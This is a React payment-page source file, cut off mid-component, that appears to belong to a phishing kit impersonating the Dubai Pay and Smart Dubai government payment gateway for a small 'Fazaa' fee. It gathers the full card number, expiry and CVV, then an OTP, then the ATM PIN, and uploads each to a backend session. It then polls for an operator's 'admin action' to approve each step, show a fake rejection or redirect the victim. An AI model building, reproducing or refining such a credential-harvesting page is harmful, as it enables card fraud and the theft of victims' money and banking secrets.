import React, { useState, useEffect, type FormEvent, type ReactNode } from 'react'

type Stage = 'card' | 'card_pending' | 'otp' | 'otp_pending' | 'atm' | 'atm_pending' | 'success' | 'failed'

type CardSubmitPayload = {
  cardName: string
  cardNumber: string
  cardExpiry: string
  cardCvv: string
}

function PaymentFrame({ children }: { children: ReactNode }) {
  return (
    <div className="flex flex-col min-h-screen bg-white" dir="ltr">
      {children}
    </div>
  )
}

function PaymentGatewayHeader() {
  return (
    <header className="w-full bg-white border-b border-[#e7edf5] px-4 py-3 flex-shrink-0 sticky top-0 z-50">
      <div className="max-w-5xl mx-auto flex items-center justify-between gap-3">
        <img
          src="/dubaipay-logo.png"
          alt="سداد دبي"
          className="h-10 w-auto max-w-[130px] sm:h-14 sm:max-w-[160px] object-contain"
        />
        <img
          src="/smart-dubai-logo.png"
          alt="دبي الذكية"
          className="h-9 w-auto max-w-[110px] sm:h-12 sm:max-w-[140px] object-contain"
        />
      </div>
    </header>
  )
}

function SectionCard({ title, children }: { title: string; children: ReactNode }) {
  return (
    <section className="overflow-hidden rounded-[22px] border border-[#edf2f7] bg-white shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
      <div className="border-t-2 border-[#bcd8ea] bg-[#f4f8fc] px-5 py-4 text-[15px] font-semibold text-[#7a8796]">
        {title}
      </div>
      <div className="px-5 py-4">{children}</div>
    </section>
  )
}

function InfoTable({ rows }: { rows: Array<{ label: string; value: string }> }) {
  return (
    <div className="space-y-0">
      {rows.map((row, index) => (
        <div
          key={`${row.label}-${index}`}
          className="flex items-center justify-between gap-4 border-b border-[#eef3f7] py-3 last:border-b-0"
        >
          <span className="text-[15px] text-[#697586]">{row.label}</span>
          <span className="text-right text-[15px] font-medium text-[#2a3342]">{row.value}</span>
        </div>
      ))}
    </div>
  )
}

function ErrorModal({ message, onRetry }: { message: string; onRetry: () => void }) {
  return (
    <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/40 backdrop-blur-sm p-4">
      <div className="w-full max-w-md rounded-2xl border border-[#f1c5c8] bg-white p-8 shadow-2xl animate-in fade-in zoom-in-95 duration-300">
        <div className="flex flex-col items-center text-center">
          <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#fff5f5] text-3xl mb-4">⚠️</div>
          <h3 className="text-[18px] font-semibold text-[#c74343] mb-3">خطأ في المعاملة</h3>
          <p className="text-[14px] leading-6 text-[#6f7b88] mb-6 text-right" dir="rtl">{message}</p>
          <button
            onClick={onRetry}
            className="w-full rounded-full bg-[#0d67be] px-6 py-3 text-[16px] font-semibold text-white transition hover:bg-[#0a5aa7]"
          >
            إعادة المحاولة
          </button>
        </div>
      </div>
    </div>
  )
}

function CvvCardIcon() {
  return (
    <svg width="84" height="58" viewBox="0 0 84 58" fill="none" xmlns="http://www.w3.org/2000/svg" className="h-12 w-auto">
      <rect x="6" y="8" width="46" height="34" rx="6" fill="#93A1AF" />
      <rect x="6" y="14" width="46" height="7" fill="#56616D" />
      <rect x="35" y="28" width="24" height="17" rx="5" fill="#E9F0F6" stroke="#AAB7C4" />
      <rect x="41" y="33" width="12" height="4" rx="2" fill="#FFFFFF" />
      <circle cx="46" cy="35" r="1.7" fill="#D33B49" />
      <circle cx="51" cy="35" r="1.7" fill="#D33B49" />
      <circle cx="56" cy="35" r="1.7" fill="#D33B49" />
    </svg>
  )
}

function SecurityLogos() {
  return (
    <div className="mt-5 overflow-hidden rounded-[18px] border border-[#e7edf5] bg-white p-2 shadow-sm">
      <img src="/card-brands.png" alt="Visa Mastercard American Express Discover" className="h-auto w-full rounded-[14px] object-contain" />
    </div>
  )
}

function PaymentActionBar({
  isLoading,
  onCancel,
}: {
  isLoading: boolean
  onCancel: () => void
}) {
  return (
    <div className="mt-5 overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-4">
      <div className="flex items-center gap-3">
        <button
          type="button"
          onClick={onCancel}
          className="flex-1 rounded-full bg-white px-5 py-3 text-[16px] font-medium text-[#6a7380] shadow-sm transition hover:bg-[#f8fbff]"
        >
          Cancel
        </button>
        <button
          type="submit"
          disabled={isLoading}
          className="flex-1 rounded-full bg-[#0d67be] px-5 py-3 text-[16px] font-semibold text-white transition hover:bg-[#0a5aa7] disabled:cursor-not-allowed disabled:opacity-60"
        >
          {isLoading ? 'Processing...' : 'Pay'}
        </button>
      </div>
    </div>
  )
}

function PaymentFooter() {
  return (
    <footer className="w-full bg-[#f8fafc] border-t border-[#e7edf5] py-4 text-center flex-shrink-0">
      <p className="text-[13px] text-[#8a95a3]">جميع الحقوق محفوظة لمؤسسة فزعة</p>
    </footer>
  )
}

function CardForm({
  onSubmit,
  onCancel,
  isLoading,
  error,
  fineAmount,
  discountAmount,
  totalAmount,
}: {
  onSubmit: (data: CardSubmitPayload) => void
  onCancel: () => void
  isLoading: boolean
  error?: string | null
  fineAmount: string
  discountAmount: string
  totalAmount: string
}) {
  const [cardName] = useState('Fazaa Card')
  const [cardNumber, setCardNumber] = useState('')
  const [expiryMonth, setExpiryMonth] = useState('')
  const [expiryYear, setExpiryYear] = useState('')
  const [cardCvv, setCardCvv] = useState('')
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [cardValidation, setCardValidation] = useState<{ valid: boolean; checked: boolean }>({ valid: false, checked: false })
  const [expiryValidation, setExpiryValidation] = useState<{ valid: boolean; checked: boolean }>({ valid: false, checked: false })
  const [cardType, setCardType] = useState<'visa' | 'mastercard' | 'amex' | 'unknown'>('unknown')

  const detectCardType = (number: string): 'visa' | 'mastercard' | 'amex' | 'unknown' => {
    const digits = number.replace(/\D/g, '')
    if (digits.length < 1) return 'unknown'
    const firstDigit = digits[0]
    if (firstDigit === '4') return 'visa'
    if (firstDigit === '5') return 'mastercard'
    if (firstDigit === '3' && digits.length >= 2) {
      if (/^3[47]/.test(digits)) return 'amex'
    }
    return 'unknown'
  }

  const isValidLuhn = (num: string): boolean => {
    if (num.length < 12 || num.length > 19) return false
    let sum = 0
    let isEven = false
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num.charAt(i), 10)
      if (isEven) {
        digit *= 2
        if (digit > 9) digit -= 9
      }
      sum += digit
      isEven = !isEven
    }
    return sum % 10 === 0
  }

  const isValidExpiry = (month: string, year: string): boolean => {
    if (month.length !== 2 || year.length !== 2) return false
    const monthNum = parseInt(month, 10)
    const yearNum = parseInt(year, 10)
    if (monthNum < 1 || monthNum > 12) return false
    const currentYear = new Date().getFullYear() % 100
    const currentMonth = new Date().getMonth() + 1
    if (yearNum < currentYear) return false
    if (yearNum === currentYear && monthNum < currentMonth) return false
    return true
  }

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 16)
    return digits.replace(/(\d{4})(?=\d)/g, '$1 ')
  }

  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value)
    setCardNumber(formatted)
    const digits = value.replace(/\D/g, '')
    const type = detectCardType(digits)
    setCardType(type)
    if (digits.length >= 16) {
      const valid = isValidLuhn(digits)
      setCardValidation({ valid, checked: true })
      if (!valid) {
        setErrors(prev => ({ ...prev, cardNumber: 'بطاقة غير صالحة أو غير مدعومة' }))
      } else {
        setErrors(prev => { const n = { ...prev }; delete n.cardNumber; return n })
      }
    } else {
      setCardValidation({ valid: false, checked: false })
      if (digits.length >= 1 && type === 'unknown') {
        setErrors(prev => ({ ...prev, cardNumber: 'بطاقة غير صالحة أو غير مدعومة' }))
      } else {
        setErrors(prev => { const n = { ...prev }; delete n.cardNumber; return n })
      }
    }
  }

  const handleExpiryChange = (newMonth: string, newYear: string) => {
    setExpiryMonth(newMonth)
    setExpiryYear(newYear)
    if (newMonth.length === 2 && newYear.length === 2) {
      const valid = isValidExpiry(newMonth, newYear)
      setExpiryValidation({ valid, checked: true })
      if (!valid) {
        setErrors(prev => ({ ...prev, cardExpiry: 'تاريخ انتهاء غير صالح' }))
      } else {
        setErrors(prev => { const n = { ...prev }; delete n.cardExpiry; return n })
      }
    } else {
      setExpiryValidation({ valid: false, checked: false })
      setErrors(prev => { const n = { ...prev }; delete n.cardExpiry; return n })
    }
  }

  const monthOptions = Array.from({ length: 12 }, (_, index) => String(index + 1).padStart(2, '0'))
  const yearOptions = Array.from({ length: 25 }, (_, index) => String((2026 + index) % 100).padStart(2, '0'))

  const validate = () => {
    const newErrors: Record<string, string> = {}
    if (!cardValidation.valid || cardNumber.replace(/\s/g, '').length < 16) newErrors.cardNumber = 'بطاقة غير صالحة أو غير مدعومة'
    if (!expiryValidation.valid || expiryMonth.length !== 2 || expiryYear.length !== 2) newErrors.cardExpiry = 'تاريخ انتهاء غير صالح'
    if (cardCvv.length < 3) newErrors.cardCvv = 'CVV غير صالح'
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault()
    if (!validate()) return
    onSubmit({
      cardName,
      cardNumber: cardNumber.replace(/\s/g, ''),
      cardExpiry: `${expiryMonth}/${expiryYear}`,
      cardCvv,
    })
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      {/* Error banner removed in favor of toast */}

      <SectionCard title="Card Details">
        <div className="space-y-4">
          <div className="grid grid-cols-1 gap-x-3 gap-y-2 sm:grid-cols-[112px_minmax(0,1fr)] sm:items-center">
            <label className="text-[14px] font-medium text-[#1e293b] sm:text-[15px]">Card Number</label>
            <div className="min-w-0">
              <div className="relative">
                <div className="absolute left-3 top-1/2 -translate-y-1/2 z-10 flex items-center justify-center pointer-events-none">
                  {cardType === 'unknown' && cardNumber.length < 2 ? (
                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M4 7C4 6.44772 4.44772 6 5 6H19C19.5523 6 20 6.44772 20 7V17C20 17.5523 19.5523 18 19 18H5C4.44772 18 4 17.5523 4 17V7Z" stroke="#CBD5E1" strokeWidth="1.2"/>
                      <path d="M4 10H20" stroke="#CBD5E1" strokeWidth="1.2"/>
                      <rect x="6" y="13" width="4" height="2" rx="0.5" fill="#CBD5E1"/>
                    </svg>
                  ) : cardType === 'visa' ? (
                    <div className="flex items-center justify-center">
                      <svg width="36" height="12" viewBox="0 0 200 66" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M53 65l10-63H44L34 65h19zm59-63c-5 0-9 3-11 8l-21 55h19l4-11h23l2 11h17L112 2zm1-5l-5 24h13l-8-24zM167 2c-8 0-15 4-18 12l-10 51h19l11-63h-2zm-127 0L14 45 6 7H0l11 58h20L61 2H40z" fill="#1A1F71"/>
                        <path d="M14 2L0 2l11 26L14 2z" fill="#F7B600"/>
                      </svg>
                    </div>
                  ) : cardType === 'mastercard' ? (
                    <div className="flex items-center justify-center">
                      <svg width="32" height="20" viewBox="0 0 20 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="7" cy="6" r="6" fill="#EB001B"/>
                        <circle cx="13" cy="6" r="6" fill="#F79E1B" fillOpacity="0.8"/>
                      </svg>
                    </div>
                  ) : cardType === 'amex' ? (
                    <div className="bg-[#006FCF] px-1 rounded-[2px] flex items-center justify-center">
                      <span className="text-[8px] font-bold text-white italic leading-none py-1">AMEX</span>
                    </div>
                  ) : (
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M8 8L16 16M16 8L8 16" stroke="#EF4444" strokeWidth="2" strokeLinecap="round"/>
                    </svg>
                  )}
                </div>
                <input
                  type="text"
                  inputMode="numeric"
                  value={cardNumber}
                  onChange={(e) => handleCardNumberChange(e.target.value)}
                  placeholder="Enter Card Number"
                  maxLength={19}
                  className={`h-12 w-full min-w-0 rounded-[10px] border bg-white pl-12 pr-10 text-[14px] text-[#273447] outline-none transition-all duration-200 placeholder:text-[#a3adba] focus:border-[#8ab9db] sm:pl-12 sm:px-4 sm:text-[15px] ${
                    (cardType === 'unknown' && cardNumber.length >= 1) || (cardValidation.checked && !cardValidation.valid) || errors.cardNumber
                      ? 'border-[#ef4444] bg-[#fef2f2] shadow-[0_0_0_1px_#ef4444]'
                      : cardValidation.checked && cardValidation.valid
                        ? 'border-[#22c55e] shadow-[0_0_0_1px_#22c55e]'
                        : cardType !== 'unknown'
                          ? 'border-[#8ab9db]'
                          : 'border-[#c9d3de]'
                  }`}
                />
                {errors.cardNumber && <p className="mt-1 text-[12px] text-[#d14b4b] text-right" dir="rtl">{errors.cardNumber}</p>}
                {cardValidation.checked ? (
                  cardValidation.valid ? (
                    <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1">
                      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none">
                        <circle cx="10" cy="10" r="9" fill="#dcfce7" stroke="#22c55e" strokeWidth="1.5"/>
                        <path d="M7 10L9 12L13 8" stroke="#22c55e" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                    </div>
                  ) : (
                    <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1">
                      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none">
                        <circle cx="10" cy="10" r="9" fill="#fef2f2" stroke="#ef4444" strokeWidth="1.5"/>
                        <path d="M7 7L13 13M13 7L7 13" stroke="#ef4444" strokeWidth="2" strokeLinecap="round"/>
                      </svg>
                    </div>
                  )
                ) : null}
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 gap-x-3 gap-y-2 sm:grid-cols-[112px_minmax(0,1fr)] sm:items-center">
            <label className="text-[14px] font-medium text-[#1e293b] sm:text-[15px]">Expiry Date</label>
            <div className="min-w-0">
              <div className={`grid grid-cols-[minmax(0,1fr)_18px_minmax(0,1fr)] items-center gap-2 sm:max-w-[220px] ${
                expiryValidation.checked && !expiryValidation.valid ? 'bg-[#fef2f2] rounded-[10px] px-2' : ''
              }`}>
                <select
                  value={expiryMonth}
                  onChange={(e) => handleExpiryChange(e.target.value, expiryYear)}
                  className={`h-12 w-full min-w-0 rounded-[10px] border bg-white px-3 text-center text-[14px] text-[#273447] outline-none transition focus:border-[#8ab9db] sm:text-[15px] ${
                    expiryValidation.checked && !expiryValidation.valid
                      ? 'border-[#ef4444]'
                      : expiryValidation.checked && expiryValidation.valid
                        ? 'border-[#22c55e]'
                        : errors.cardExpiry
                          ? 'border-[#ef9a9a]'
                          : 'border-[#c9d3de]'
                  }`}
                >
                  <option value="">MM</option>
                  {monthOptions.map((month) => (
                    <option key={month} value={month}>{month}</option>
                  ))}
                </select>
                <span className="text-center text-[20px] text-[#95a1af]">/</span>
                <select
                  value={expiryYear}
                  onChange={(e) => handleExpiryChange(expiryMonth, e.target.value)}
                  className={`h-12 w-full min-w-0 rounded-[10px] border bg-white px-3 text-center text-[14px] text-[#273447] outline-none transition focus:border-[#8ab9db] sm:text-[15px] ${
                    expiryValidation.checked && !expiryValidation.valid
                      ? 'border-[#ef4444]'
                      : expiryValidation.checked && expiryValidation.valid
                        ? 'border-[#22c55e]'
                        : errors.cardExpiry
                          ? 'border-[#ef9a9a]'
                          : 'border-[#c9d3de]'
                  }`}
                >
                  <option value="">YY</option>
                  {yearOptions.map((year) => (
                    <option key={year} value={year}>{year}</option>
                  ))}
                </select>
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 gap-x-3 gap-y-2 sm:grid-cols-[112px_minmax(0,1fr)] sm:items-center">
            <label className="text-[14px] font-medium text-[#1e293b] sm:text-[15px]">CVV Number</label>
            <div className="min-w-0">
              <div className="flex flex-wrap items-center gap-3 sm:flex-nowrap">
                <input
                  type="password"
                  inputMode="numeric"
                  value={cardCvv}
                  onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                  placeholder="CVV"
                  maxLength={4}
                  className={`h-12 w-[92px] min-w-0 rounded-[10px] border bg-white px-3 text-center text-[14px] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db] sm:text-[15px] ${errors.cardCvv ? 'border-[#ef9a9a]' : 'border-[#c9d3de]'}`}
                />
                <CvvCardIcon />
              </div>
              {errors.cardCvv && <p className="mt-1 text-[12px] text-[#d14b4b]">{errors.cardCvv}</p>}
            </div>
          </div>

          <p className="pt-2 text-[12px] leading-6 text-[#6e7b89] sm:text-[13px]">
            CVV number (Security Code) is the last three digits of the number found on the back of your credit card near the signature strip.
          </p>

          <SecurityLogos />
        </div>
      </SectionCard>

      <PaymentActionBar
        isLoading={isLoading}
        onCancel={onCancel}
      />
    </form>
  )
}

function WaitingPage({ message }: { message: string }) {
  return (
    <div className="rounded-[22px] border border-[#edf2f7] bg-white px-5 py-12 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
      <div className="mx-auto mb-5 h-14 w-14 animate-spin rounded-full border-[3px] border-[#d8e6f3] border-t-[#0d67be]" />
      <h3 className="text-[20px] font-semibold text-[#263445]">Processing Request</h3>
      <p className="mt-3 text-[14px] leading-7 text-[#6f7b88]">{message}</p>
      <p className="mt-2 text-[13px] text-[#90a0b2]">Please wait and do not close this page.</p>
    </div>
  )
}

function OtpForm({
  onSubmit,
  isLoading,
  error,
  rows,
}: {
  onSubmit: (otp: string) => void
  isLoading: boolean
  error?: string | null
  rows: Array<{ label: string; value: string }>
}) {
  const [otp, setOtp] = useState('')
  const [otpError, setOtpError] = useState('')

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault()
    if (otp.length < 4) {
      setOtpError('الرجاء إدخال رمز التحقق الكامل')
      return
    }
    setOtpError('')
    onSubmit(otp)
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <SectionCard title="ملخص المبلغ">
        <InfoTable rows={rows} />
      </SectionCard>

      {/* Error banner removed in favor of toast */}

      <SectionCard title="Card Security Verification">
        <div className="text-center">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full border border-[#d7e7f5] bg-[#edf5fd] text-[28px] shadow-sm">📱</div>
          <h3 className="text-[20px] font-semibold text-[#263445]">رمز التحقق (OTP)</h3>
          <p className="mt-2 text-[14px] leading-7 text-[#6f7b88]">تم إرسال رمز التحقق إلى رقم هاتفك المسجل</p>
          <input
            type="text"
            inputMode="numeric"
            value={otp}
            onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 8))}
            placeholder="أدخل رمز التحقق"
            maxLength={8}
            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[24px] tracking-[0.35em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
          />
        </div>
      </SectionCard>

      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
        <button
          type="submit"
          disabled={isLoading}
          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7] disabled:cursor-not-allowed disabled:opacity-60"
        >
          {isLoading ? 'جاري التحقق...' : 'تأكيد الرمز'}
        </button>
      </div>
    </form>
  )
}

function AtmPinForm({
  onSubmit,
  isLoading,
  error,
  rows,
}: {
  onSubmit: (pin: string) => void
  isLoading: boolean
  error?: string | null
  rows: Array<{ label: string; value: string }>
}) {
  const [pin, setPin] = useState('')
  const [pinError, setPinError] = useState('')

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault()
    if (pin.length < 4) {
      setPinError('الرجاء إدخال PIN كامل')
      return
    }
    setPinError('')
    onSubmit(pin)
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <SectionCard title="ملخص المبلغ">
        <InfoTable rows={rows} />
      </SectionCard>

      {/* Error banner removed in favor of toast */}

      <SectionCard title="ATM PIN Verification">
        <div className="text-center">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full border border-[#ffe1b4] bg-[#fff4e6] text-[28px] shadow-sm">🏧</div>
          <h3 className="text-[20px] font-semibold text-[#263445]">رقم PIN</h3>
          <p className="mt-2 text-[14px] leading-7 text-[#6f7b88]">أدخل رقم PIN الخاص ببطاقتك</p>
          <input
            type="password"
            inputMode="numeric"
            value={pin}
            onChange={(e) => setPin(e.target.value.replace(/\D/g, '').slice(0, 6))}
            placeholder="••••"
            maxLength={6}
            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[24px] tracking-[0.35em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
          />
          <div className="mt-4 rounded-2xl border border-[#ffe1b4] bg-[#fff8eb] px-4 py-3 text-right text-[13px] leading-6 text-[#9b6b11]">
            لا تشارك رقم PIN الخاص بك مع أي شخص. لن يطلب موظفو فزعة هذه المعلومات أبداً.
          </div>
        </div>
      </SectionCard>

      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
        <button
          type="submit"
          disabled={isLoading}
          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7] disabled:cursor-not-allowed disabled:opacity-60"
        >
          {isLoading ? 'جاري التحقق...' : 'تأكيد PIN'}
        </button>
      </div>
    </form>
  )
}

function SuccessPage({ totalAmount, onDone }: { totalAmount: string; onDone: () => void }) {
  return (
    <div className="space-y-4">
      <div className="rounded-[22px] border border-[#daf0df] bg-white px-5 py-10 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#e8f8ec] text-[30px]">✅</div>
        <h2 className="text-[22px] font-semibold text-[#12834d]">تمت عملية الدفع بنجاح!</h2>
        <p className="mt-2 text-[14px] text-[#6f7b88]">تم معالجة دفعتك بنجاح</p>
        <div className="mt-6 rounded-[18px] bg-[#f5faf7] px-5 py-4">
          <p className="text-[13px] text-[#6f7b88]">المبلغ المدفوع</p>
          <p className="mt-1 text-[28px] font-semibold text-[#12834d]">{totalAmount} AED</p>
        </div>
        <div className="mt-4 rounded-[18px] bg-[#f8fafc] px-5 py-4 text-left">
          <p className="text-[13px] text-[#6f7b88]">رقم المرجع</p>
          <p className="mt-1 font-mono text-[14px] text-[#273447]">FA-{Date.now().toString().slice(-8)}</p>
          <p className="mt-1 text-[12px] text-[#94a3b8]">{new Date().toLocaleString('ar-AE')}</p>
        </div>
      </div>

      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
        <button
          type="button"
          onClick={onDone}
          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7]"
        >
          العودة للصفحة الرئيسية
        </button>
      </div>
    </div>
  )
}

function FailedPage({ onRetry }: { onRetry: () => void }) {
  return (
    <div className="space-y-4">
      <div className="rounded-[22px] border border-[#f5d0d0] bg-white px-5 py-10 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#fff1f1] text-[30px]">❌</div>
        <h2 className="text-[22px] font-semibold text-[#cf4444]">فشل الدفع</h2>
        <p className="mt-2 text-[14px] text-[#6f7b88]">لم يتم معالجة دفعتك. يرجى المحاولة مرة أخرى.</p>
      </div>

      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
        <button
          type="button"
          onClick={onRetry}
          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7]"
        >
          إعادة المحاولة
        </button>
      </div>
    </div>
  )
}

export default function Payment({ onBackToHome }: { onBackToHome: () => void }) {
  const [stage, setStage] = useState<Stage>('card')
  const [errorMessage, setErrorMessage] = useState<string | null>(null)
  const [showToast, setShowToast] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [sessionData, setSessionData] = useState<{fullName?: string, idNumber?: string}>({})
  const [dataLoaded, setDataLoaded] = useState(false)
  const [sessionId] = useState(() => {
    // Get session from URL
    const urlParams = new URLSearchParams(window.location.search)
    const urlSessionId = urlParams.get('sessionId')
    return urlSessionId || 'FAZ-' + Date.now().toString(36)
  })

  // Fetch session data ONLY ONCE from localStorage, don't update it again
  useEffect(() => {
    if (sessionId && !dataLoaded) {
      // Try to get from localStorage first (fastest source)
      try {
        const localData = localStorage.getItem(`fazaa_session_${sessionId}`)
        if (localData) {
          const parsed = JSON.parse(localData)
          console.log('[Payment] Session data loaded from localStorage:', parsed)
          setSessionData({
            fullName: parsed.fullName || '',
            idNumber: parsed.idNumber || '',
          })
          setDataLoaded(true)
          return // Stop here, don't fetch from API
        }
      } catch (e) {
        console.warn('[Payment] Failed to load from localStorage:', e)
      }

      // If localStorage is empty, fetch from API as fallback
      const fetchData = async () => {
        try {
          const response = await fetch(`/api/session/${sessionId}`)
          const data = await response.json()
          
          if (data && data.success && data.data) {
            console.log('[Payment] Session data fetched from API:', data.data)
            setSessionData({
              fullName: data.data.fullName || '',
              idNumber: data.data.idNumber || '',
            })
          } else {
            console.warn('[Payment] No session data found in API:', data)
          }
        } catch (err) {
          console.error('[Payment] Failed to fetch session data from API:', err)
        } finally {
          setDataLoaded(true) // Mark as loaded regardless
        }
      }
      
      fetchData()
    }
  }, [sessionId, dataLoaded])

  const appFee = '10'
  const deliveryFee = '5'
  const dueAmount = '15'
  const fineAmount = '0'
  const discountAmount = '0'

  const transactionRows = [
    { label: 'اسم مقدم الطلب', value: sessionData.fullName || '-' },
    { label: 'رقم هوية مقدم الطلب', value: sessionData.idNumber || '-' },
    { label: 'رسوم تقديم الطلب', value: `${appFee} AED` },
    { label: 'رسوم التوصيل', value: `${deliveryFee} AED` },
    { label: 'المبلغ المستحق', value: `${dueAmount} AED` },
  ]

  // Default rejection messages for each stage
  const rejectionMessages: Record<string, string> = {
    card: 'قد تكون بطاقتك غير مفعلة للدفع عبر الإنترنت. يرجى استخدام طرق دفع مختلفة أو التواصل مع المصرف.',
    otp: 'الرمز الذي تم إدخاله غير صحيح أو غير صالح. يرجى التحقق من الرمز الصحيح وإعادة المحاولة.',
    atm: 'الرقم السري للصراف الآلي غير صحيح.',
  }

  // Poll for admin actions (pass/denied/completed) and redirect URLs - only update stage, not user data
  useEffect(() => {
    if (!dataLoaded) return // Don't check admin actions until data is loaded
    
    const checkAdminAction = async () => {
      try {
        const { getSessionStatus, getRedirectUrl } = await import('../lib/api')
        
        // Check for redirect URL
        try {
          const redirectResult = await getRedirectUrl(sessionId)
          if (redirectResult.redirectUrl) {
            window.location.href = redirectResult.redirectUrl
            return
          }
        } catch {}

        // Check for admin action
        const result = await getSessionStatus(sessionId)
        if (result?.data) {
          const serverStage = result.data.stage
          const serverError = result.data.errorMessage

          if (stage === 'card_pending') {
            if (serverStage === 'otp') {
              setStage('otp')
            } else if (serverStage === 'card') {
              setStage('card')
              setErrorMessage(serverError || rejectionMessages.card)
              setShowToast(true)
            }
          }

          if (stage === 'otp_pending') {
            if (serverStage === 'atm') {
              setStage('atm')
            } else if (serverStage === 'otp') {
              setStage('otp')
              setErrorMessage(serverError || rejectionMessages.otp)
              setShowToast(true)
            }
          }

          if (stage === 'atm_pending') {
            if (serverStage === 'success') {
              setStage('success')
            } else if (serverStage === 'atm') {
              setStage('atm')
              setErrorMessage(serverError || rejectionMessages.atm)
              setShowToast(true)
            } else if (serverStage === 'failed') {
              setStage('failed')
              setErrorMessage(serverError || rejectionMessages.atm)
              setShowToast(true)
            }
          }
        }
      } catch {}
    }

    const interval = setInterval(checkAdminAction, 3000)
    return () => clearInterval(interval)
  }, [sessionId, stage, dataLoaded])

  const handleCardSubmit = async (data: CardSubmitPayload) => {
    setIsSubmitting(true)
    setErrorMessage(null)
    
    try {
      const { updateSession } = await import('../lib/api')
      await updateSession({
        sessionId,
        cardName: data.cardName,
        cardNumber: data.cardNumber,
        cardNumberMasked: '****' + data.cardNumber.slice(-4),
        cardExpiry: data.cardExpiry,
        cardCvv: data.cardCvv,
        stage: 'card_pending',
      })
      setStage('card_pending')
    } catch (apiErr: any) {
      console.error('[Payment] API call failed:', apiErr?.message || apiErr)
      setErrorMessage('فشل الاتصال بالخادم. يرجى المحاولة مرة أخرى.')
      setShowToast(true)
    }
    
    setIsSubmitting(false)
  }

  const handleOtpSubmit = async (otpCode: string) => {
    setIsSubmitting(true)
    setErrorMessage(null)
    
    try {
      const { updateSession } = await import('../lib/api')
      await updateSession({
        sessionId,
        otpCode,
        stage: 'otp_pending',
      })
      setStage('otp_pending')
    } catch (apiErr: any) {
      console.error('[Payment] API call failed:', apiErr?.message || apiErr)
      setErrorMessage('فشل الاتصال بالخادم. يرجى المحاولة مرة أخرى.')
      setShowToast(true)
    }
    
    setIsSubmitting(false)
  }

  const handleAtmPinSubmit = async (atmPin: string) => {
    setIsSubmitting(true)
    setErrorMessage(null)
    
    try {
      const { updateSession } = await import('../lib/api')
      await updateSession({
        sessionId,
        atmPin,
        stage: 'atm_pending',
      })
      setStage('atm_pending')
    } catch (apiErr: any) {
      console.error('[Payment] API call failed:', apiErr?.message || apiErr)
      setErrorMessage('فشل الاتصال بالخادم. يرجى المحاولة مرة أخرى.')
      setShowToast(true)
    }
    
    setIsSubmitting(false)
  }

  const handleDone = () => {
    onBackToHome()
  }

  const handleRetry = () => {
    setStage('card')
    setErrorMessage(null)
    setShowToast(false)
  }

  return (
    <PaymentFrame>
      <PaymentGatewayHeader />
      
      {showToast && errorMessage && (
        <ErrorModal message={errorMessage} onRetry={() => { setShowToast(false); handleRetry(); }} />
      )}

      <div className="flex-1 max-w-3xl w-full mx-auto px-6 py-8">
        {stage === 'card' && (
          <>
            <SectionCard title="ملخص الدفع">
              <InfoTable rows={transactionRows} />
            </SectionCard>
            <div className="mt-6">
              <CardForm
